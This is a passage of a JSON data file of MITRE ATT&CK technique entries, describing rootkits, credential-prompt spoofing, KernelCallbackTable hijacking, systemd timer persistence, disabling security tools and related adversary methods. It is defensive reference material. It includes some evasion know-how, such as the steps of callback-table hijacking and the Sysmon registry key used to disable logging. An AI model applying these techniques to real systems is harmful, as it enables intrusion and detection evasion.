LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).^[[2]](http://www.tldp.org/LDP/lkmpg/2.4/html/x437.html)^ Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.^[[3]](http://www.megasecurity.org/papers/Rootkits.pdf)^\n\nKernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through `kextload` and `kextunload` commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.^[[4]](https://support.apple.com/guide/deployment/system-and-kernel-extensions-in-macos-depa5fb8376f/web)^\n\nSince macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces.^[[5]](https://developer.apple.com/support/kernel-extensions/)^\n\nAdversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003) and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on a system. Examples have been found in the wild, and there are some relevant open source projects as well.^[[6]](https://volatility-labs.blogspot.com/2012/10/phalanx-2-revealed-using-volatility-to.html)^^[[7]](https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/)^^[[8]](https://github.com/f0rb1dd3n/Reptile)^^[[9]](https://github.com/m0nad/Diamorphine)^^[[10]](https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf)^^[[11]](https://www.synack.com/2017/09/08/high-sierras-secure-kernel-extension-loading-is-broken/)^^[[12]](https://securelist.com/the-ventir-trojan-assemble-your-macos-spy/67267/)^^[[13]](https://blog.trendmicro.com/trendlabs-security-intelligence/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload/)^","platforms":["macOS","Linux"],"tactics":["Persistence","Privilege Escalation"],"campaigns":["Operation CuckooBees"],"groups":[]},"T1056.002":{"id":"T1056.002","name":"GUI Input Capture","description":"Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.^[[1]](https://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html)^ This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)^[[2]](https://logrhythm.com/blog/do-you-trust-your-computer/)^^[[3]](https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/)^^[[4]](https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/)^ and [PowerShell](https://attack.mitre.org/techniques/T1059/001).^[[2]](https://logrhythm.com/blog/do-you-trust-your-computer/)^^[[5]](https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/)^^[[4]](https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/)^ On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).^[[4]](https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/)^ ","platforms":["macOS","Windows","Linux"],"tactics":["Collection","Credential Access"],"campaigns":[],"groups":["FIN4"]},"T1588.002":{"id":"T1588.002","name":"Tool","description":"Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.^[[1]](https://www.recordedfuture.com/identifying-cobalt-strike-servers/)^\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":["Operation Spalax","Operation CuckooBees","Night Dragon","C0021","Operation Wocao","CostaRicto","Operation Dream Job","C0018","C0027","C0010","Frankenstein","C0015","C0017","FunnyDream"],"groups":["DarkVishnya","Turla","Inception","Magic Hound","BITTER","Kimsuky","BlackTech","MuddyWater","LAPSUS$","Leafminer","APT29","APT28","Wizard Spider","Ember Bear","BRONZE BUTLER","menuPass","APT41","FIN8","TA505","APT39","GALLIUM","Cleaver","BackdoorDiplomacy","TA2541","FIN6","Sandworm Team","Patchwork","FIN7","LuminousMoth","APT-C-36","WIRTE","FIN13","Cobalt Group","Ke3chang","Threat Group-3390","Lazarus Group","FIN5","Thrip","Moses Staff","POLONIUM","PittyTiger","HEXANE","Whitefly","FIN10","Dragonfly","IndigoZebra","Aquatic Panda","Aoqin Dragon","APT38","Earth Lusca","APT33","Ferocious Kitten","APT32","Gorgon Group","Silence","Chimera","Metador","CopyKittens","Silent Librarian","TEMP.Veles","Volt Typhoon","APT19","Blue Mockingbird","APT1","Carbanak","DarkHydrus","CostaRicto","Frankenstein","Night Dragon"]},"T1052.001":{"id":"T1052.001","name":"Exfiltration over USB","description":"Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.","platforms":["Linux","macOS","Windows"],"tactics":["Exfiltration"],"campaigns":[],"groups":["Tropic Trooper","Mustang Panda"]},"T1574.013":{"id":"T1574.013","name":"KernelCallbackTable","description":"Adversaries may abuse the `KernelCallbackTable` of a process to hijack its execution flow in order to run their own payloads.^[[1]](https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/)^(Citation: FinFisher exposed ) The `KernelCallbackTable` can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once `user32.dll` is loaded.^[[2]](https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/)^\n\nAn adversary may hijack the execution flow of a process using the `KernelCallbackTable` by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process.\n\nA pointer to the memory address of the `KernelCallbackTable` can be obtained by locating the PEB (ex: via a call to the `NtQueryInformationProcess()` [Native API](https://attack.mitre.org/techniques/T1106) function).^[[3]](https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess)^ Once the pointer is located, the `KernelCallbackTable` can be duplicated, and a function in the table (e.g., `fnCOPYDATA`) set to the address of a malicious payload (ex: via `WriteProcessMemory()`). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.^[[1]](https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/)^\n\nThe tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the `KernelCallbackTable` may also be restored to its original state by the rest of the malicious payload.^[[1]](https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/)^ Use of the `KernelCallbackTable` to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation","Defense Evasion"],"campaigns":[],"groups":["Lazarus Group"]},"T1597":{"id":"T1597","name":"Search Closed Sources","description":"Adversaries may search and gather information about victims from closed sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data.^[[1]](https://d3security.com/blog/10-of-the-best-open-source-threat-intelligence-feeds/)^ Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.^[[2]](https://www.zdnet.com/article/a-hacker-group-is-selling-more-than-73-million-user-records-on-the-dark-web/)^\n\nAdversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["EXOTIC LILY"]},"T1053.006":{"id":"T1053.006","name":"Systemd Timers","description":"Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension `.timer` that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.^[[1]](https://wiki.archlinux.org/index.php/Systemd/Timers)^ Systemd timers may be activated remotely via the `systemctl` command line utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).^[[2]](https://www.tecmint.com/control-systemd-services-on-remote-linux-server/)^\n\nEach `.timer` file must have a corresponding `.service` file with the same name, e.g., `example.timer` and `example.service`. `.service` files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files that are managed by the systemd system and service manager.^[[3]](http://man7.org/linux/man-pages/man1/systemd.1.html)^ Privileged timers are written to `/etc/systemd/system/` and `/usr/lib/systemd/system` while user level are written to `~/.config/systemd/user/`.\n\nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.^[[4]](https://www.bleepingcomputer.com/news/security/malware-found-in-arch-linux-aur-package-repository/)^^[[5]](https://gist.github.com/campuscodi/74d0d2e35d8fd9499c76333ce027345a)^^[[6]](https://lists.archlinux.org/pipermail/aur-general/2018-July/034153.html)^ Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.^[[7]](https://www.hybrid-analysis.com/sample/28553b3a9d2ad4361d33d29ac4bf771d008e0073cec01b5561c6348a608f8dd7?environmentId=300)^","platforms":["Linux"],"tactics":["Execution","Persistence","Privilege Escalation"],"campaigns":[],"groups":[]},"T1566":{"id":"T1566","name":"Phishing","description":"Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).^[[1]](https://www.microsoft.com/en-us/security/blog/2022/09/22/malicious-oauth-applications-used-to-compromise-email-servers-and-spread-spam/)^^[[2]](https://unit42.paloaltonetworks.com/examining-vba-initiated-infostealer-campaign/)^ Another way to accomplish this is by forging or spoofing^[[3]](https://www.proofpoint.com/us/threat-reference/email-spoofing)^ the identity of the sender which can be used to fool both the human recipient as well as automated security tools.^[[4]](https://blog.cyberproof.com/blog/double-bounced-attacks-with-email-spoofing-2022-trends)^ \n\nVictims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,^[[5]](https://blog.sygnia.co/luna-moth-false-subscription-scams)^^[[6]](https://www.cisa.gov/uscert/ncas/alerts/aa23-025a)^ or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).^[[7]](https://unit42.paloaltonetworks.com/luna-moth-callback-phishing/)^","platforms":["Linux","macOS","Windows","SaaS","Office 365","Google Workspace"],"tactics":["Initial Access"],"campaigns":[],"groups":["Axiom","GOLD SOUTHFIELD","Dragonfly"]},"T1542.004":{"id":"T1542.004","name":"ROMMONkit","description":"Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. ^[[1]](https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices)^^[[2]](https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954)^\n\n\nROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005), an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.","platforms":["Network"],"tactics":["Defense Evasion","Persistence"],"campaigns":[],"groups":[]},"T1218.001":{"id":"T1218.001","name":"Compiled HTML File","description":"Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. ^[[1]](https://docs.microsoft.com/previous-versions/windows/desktop/htmlhelp/microsoft-html-help-1-4-sdk)^ CHM content is displayed using underlying components of the Internet Explorer browser ^[[2]](https://msdn.microsoft.com/windows/desktop/ms644670)^ loaded by the HTML Help executable program (hh.exe). ^[[3]](https://msdn.microsoft.com/windows/desktop/ms524405)^\n\nA custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. ^[[4]](https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/)^ ^[[5]](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8625)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["OilRig","Dark Caracal","Silence","APT41","APT38","Lazarus Group"]},"T1070.005":{"id":"T1070.005","name":"Network Share Connection Removal","description":"Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the `net use \\\\system\\share /delete` command. ^[[1]](https://technet.microsoft.com/bb490717.aspx)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Threat Group-3390"]},"T1090.003":{"id":"T1090.003","name":"Multi-hop Proxy","description":"To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network. ^[[1]](https://en.wikipedia.org/wiki/Onion_routing)^\n\nIn the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.  By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001), adversaries can add custom code to the affected network devices that will implement onion routing between those nodes.  This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network.  This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s WAN. Protocols such as ICMP may be used as a transport.","platforms":["Linux","macOS","Windows","Network"],"tactics":["Command and Control"],"campaigns":["CostaRicto","Operation Wocao"],"groups":["APT28","Inception","Leviathan","FIN4","APT29","Operation Wocao","CostaRicto"]},"T1110":{"id":"T1110","name":"Brute Force","description":"Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Linux","macOS","Google Workspace","Containers","Network"],"tactics":["Credential Access"],"campaigns":["Operation Dream Job","2016 Ukraine Electric Power Attack"],"groups":["Fox Kitten","HEXANE","Turla","DarkVishnya","FIN5","APT38","OilRig","APT39","Dragonfly","APT28","Lazarus Group","APT34"]},"T1059.004":{"id":"T1059.004","name":"Unix Shell","description":"Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.^[[1]](https://linux.die.net/man/1/bash)^^[[2]](https://support.apple.com/HT208050)^ Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.","platforms":["macOS","Linux"],"tactics":["Execution"],"campaigns":[],"groups":["TeamTNT","Rocke","APT41"]},"T1137.003":{"id":"T1137.003","name":"Outlook Forms","description":"Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.^[[1]](https://sensepost.com/blog/2017/outlook-forms-and-shells/)^\n\nOnce malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.^[[1]](https://sensepost.com/blog/2017/outlook-forms-and-shells/)^","platforms":["Windows","Office 365"],"tactics":["Persistence"],"campaigns":[],"groups":[]},"T1562.001":{"id":"T1562.001","name":"Disable or Modify Tools","description":"Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.^[[1]](https://cdn.logic-control.com/docs/scadafence/Anatomy-Of-A-Targeted-Ransomware-Attack-WP.pdf)^\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.^[[2]](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)^^[[3]](https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/)^ \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational` may be modified to tamper with and potentially disable Sysmon logging.^[[4]](https://ptylu.github.io/content/report/report.html?report=25)^ \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.^[[5]](https://www.mandiant.com/resources/blog/fortinet-malware-ecosystem)^^[[6]](https://www.fortinet.com/blog/psirt-blogs/fg-ir-22-369-psirt-analysis)^\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.^[[7]](https://www.mandiant.com/resources/chasing-avaddon-ransomware)^^[[8]](https://www.crowdstrike.com/blog/targeted-dharma-ransomware-intrusions-exhibit-consistent-techniques/)^^[[9]](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/demystifying-ransomware-attacks-against-microsoft-defender/ba-p/1928947)^^[[10]](https://www.crowdstrike.com/blog/how-doppelpaymer-hunts-and-kills-windows-processes/)^ For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.^[[9]](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/demystifying-ransomware-attacks-against-microsoft-defender/ba-p/1928947)^\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.^[[11]](https://thehackernews.com/2022/05/avoslocker-ransomware-variant-using-new.html)^","platforms":["Windows","macOS","Linux","Containers","IaaS","Network"],"tactics":["Defense Evasion"],"campaigns":["SolarWinds Compromise","2015 Ukraine Electric Power Attack","Night Dragon"],"groups":["TA2541","Turla","MuddyWater","Indrik Spider","Ember Bear","TeamTNT","FIN6","TA505","Gamaredon Group","APT29","BRONZE BUTLER","Gorgon Group","Putter Panda","Magic Hound","Aquatic Panda","Lazarus Group","Kimsuky","Rocke","Wizard Spider","UNC2452","Night Dragon"]},"T1565":{"id":"T1565","name":"Data Manipulation","description":"Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.\n\nThe type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.","platforms":["Linux","macOS","Windows"],"tactics":["Impact"],"campaigns":[],"groups":["FIN13"]},"T1559":{"id":"T1559","name":"Inter-Process Communication","description":"Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) or [Component Object Model](https://attack.mitre.org/techniques/T1559/001). Linux environments support several different IPC mechanisms, two of which being sockets and pipes.^[[1]](https://www.geeksforgeeks.org/inter-process-communication-ipc/#:~:text=Inter%2Dprocess%20communication%20(IPC),of%20co%2Doperation%20between%20them.)^ Higher level execution mediums, such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s, may also leverage underlying IPC mechanisms. Adversaries may also use [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) to facilitate remote IPC execution.^[[2]](https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html)^","platforms":["Windows","macOS","Linux"],"tactics":["Execution"],"campaigns":[],"groups":[]},"T1001":{"id":"T1001","name":"Data Obfuscation","description":"Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols. ","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":["Operation Wocao"],"groups":["Operation Wocao","Axiom"]},"T1039":{"id":"T1039","name":"Data from Network Shared Drive","description":"Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.","platforms":["Linux","macOS","Windows"],"tactics":["Collection"],"campaigns":["C0015"],"groups":["APT28","Gamaredon Group","BRONZE BUTLER","Sowbug","Chimera","menuPass","Fox Kitten"]},"T1584.006":{"id":"T1584.006","name":"Web Services","description":"Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566).^[[1]](https://www.recordedfuture.com/turla-apt-infrastructure/)^ Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":["Turla","Earth Lusca"]},"T1601":{"id":"T1601","name":"Modify System Image","description":"Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.\n\nTo change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.","platforms":["Network"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1574":{"id":"T1574","name":"Hijack Execution Flow","description":"Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\n\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.","platforms":["Linux","macOS","Windows"],"tactics":["Persistence","Privilege Escalation","Defense Evasion"],"campaigns":["C0017"],"groups":[]},"T1027.005":{"id":"T1027.005","name":"Indicator Removal from Tools","description":"Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":["Operation Wocao"],"groups":["Patchwork","Deep Panda","TEMP.Veles","GALLIUM","OilRig","Turla","APT3","Operation Wocao"]},"T1204.003":{"id":"T1204.003","name":"Malicious Image","description":"Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.^[[1]](https://summitroute.com/blog/2018/09/24/investigating_malicious_amis/)^\n\nAdversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005)).^[[2]](https://info.aquasec.com/hubfs/Threat%20reports/AquaSecurity_Cloud_Native_Threat_Report_2021.pdf?utm_campaign=WP%20-%20Jun2021%20Nautilus%202021%20Threat%20Research%20Report&utm_medium=email&_hsmi=132931006&_hsenc=p2ANqtz-_8oopT5Uhqab8B7kE0l3iFo1koirxtyfTehxF7N-EdGYrwk30gfiwp5SiNlW3G0TNKZxUcDkYOtwQ9S6nNVNyEO-Dgrw&utm_content=132931006&utm_source=hs_automation)^","platforms":["IaaS","Containers"],"tactics":["Execution"],"campaigns":[],"groups":["TeamTNT"]},"T1078":{"id":"T1078","name":"Valid Accounts","description":"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.^[[1]](https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/)^ Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. 